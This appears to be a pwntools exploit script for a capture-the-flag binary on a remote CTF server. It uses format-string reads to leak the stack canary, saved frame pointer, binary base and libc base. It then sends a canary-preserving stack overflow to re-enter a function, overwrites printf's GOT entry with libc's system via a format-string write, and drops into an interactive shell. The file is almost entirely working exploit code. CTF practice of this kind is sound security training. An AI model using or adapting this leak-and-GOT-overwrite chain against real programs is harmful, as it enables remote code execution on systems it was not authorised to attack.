#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template binary --host pwn.sprush.rocks --port 33078
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'binary')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwn.sprush.rocks'
port = int(args.PORT or 33078)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *func+62
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
func_ret_offset = 0x123D
func_offset = 0x1238

if args.LOCAL:
        offset___libc_start_main_ret = 0x29dba
        offset_system = 0x50050
        offset_dup2 = 0x0000000000116960
        offset_read = 0x000000000011ba50
        offset_write = 0x000000000011c560
        offset_str_bin_sh = 0x1cb42f
else:
        offset___libc_start_main_ret = 0x2a1ca
        offset_system = 0x0000000000058740
        offset_dup2 = 0x0000000000116960
        offset_read = 0x000000000011ba50
        offset_write = 0x000000000011c560
        offset_str_bin_sh = 0x1cb42f



io = start()
io.recvline()
libc_ret_leak = b"%15$p"
func_ret_leak = b"%13$p"
saved_rbp_leak = b"%12$p"
canary_leak = b"%11$p"

fmt = canary_leak + saved_rbp_leak + func_ret_leak + libc_ret_leak + b"\n"
io.send(fmt)
resp = io.recvline()
print(resp.decode("ascii").split("0x"))

_, canary_str, saved_rbp_leak, ret_str, libc_ret_str = resp.decode("ascii")[:-1].split("0x")
print(f"RET: {ret_str.upper()}")
print(f"CANARY: {canary_str.upper()}")
print(f"SAVED_RBP: {saved_rbp_leak.upper()}")
print(f"LIBC_RET: {libc_ret_str.upper()}")
binary_base = int(ret_str, 16) - func_ret_offset
print(f"binary_base: {hex(binary_base)}")
libc_base = int(libc_ret_str, 16) - offset___libc_start_main_ret
canary = int(canary_str, 16)
print(f"LIBC_BASE: {hex(libc_base)}")

io.sendline(b"A"*40 + p64(canary) + p64(int(saved_rbp_leak, 16)) + p64(binary_base + func_offset))

# NOW got func again
# need to overwrite printf in GOT
printf_addr = binary_base + 0x4010
system_addr = libc_base + offset_system
#pause()
fmt = fmtstr_payload(offset=6, writes={printf_addr: system_addr & 0xffffffff}, write_size='int')
print(f"Will write on {hex(printf_addr)} {hex(system_addr & 0xffffffff)}, using {len(fmt)} bytes")
print(hexdump(fmt))
io.send(fmt + b"\n")
pause()

io.sendline(b"A"*40 + p64(canary) + p64(int(saved_rbp_leak, 16)) + p64(binary_base + func_offset))

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()


